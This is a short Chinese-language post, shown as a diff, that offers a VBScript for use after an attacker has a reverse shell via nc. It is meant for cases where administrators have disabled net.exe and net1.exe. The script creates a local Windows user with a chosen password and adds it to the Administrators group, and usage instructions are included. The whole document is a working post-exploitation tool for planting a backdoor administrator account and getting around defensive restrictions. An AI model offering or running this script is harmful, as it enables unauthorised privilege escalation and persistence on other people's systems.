@@ -1,0 +1,25 @@
+真正的无net加系统用户能用的脚本。。当我们遇到提权的时候，nc反弹提权的时候，管理员把net1和net给禁用了，，我们可以上传一个脚本，，做到真正的无net加系统用户。。脚本代码如下：
+
+struser=wscript.arguments(0)
+strpass=wscript.arguments(1)
+
+set lp=createObject("WSCRIPT.NETWORK") 
+oz="WinNT://"&lp.ComputerName 
+Set ob=GetObject(oz) 
+Set oe=GetObject(oz&"/Administrators,group") 
+Set od=ob.create("user",struser) 
+od.SetPassword strpass 
+od.SetInfo 
+Set of=GetObject(oz&"/" & struser & ",user") 
+oe.Add(of.ADsPath)
+
+For Each admin in oe.Members
+if struser=admin.Name then
+Wscript.echo struser & " 建立成功!"
+wscript.quit
+end if
+Next
+
+Wscript.echo struser & " 用户建立失败!"
+
+保存以上代码为 user.vbs  用法：cscript user.vbs 用户 密码
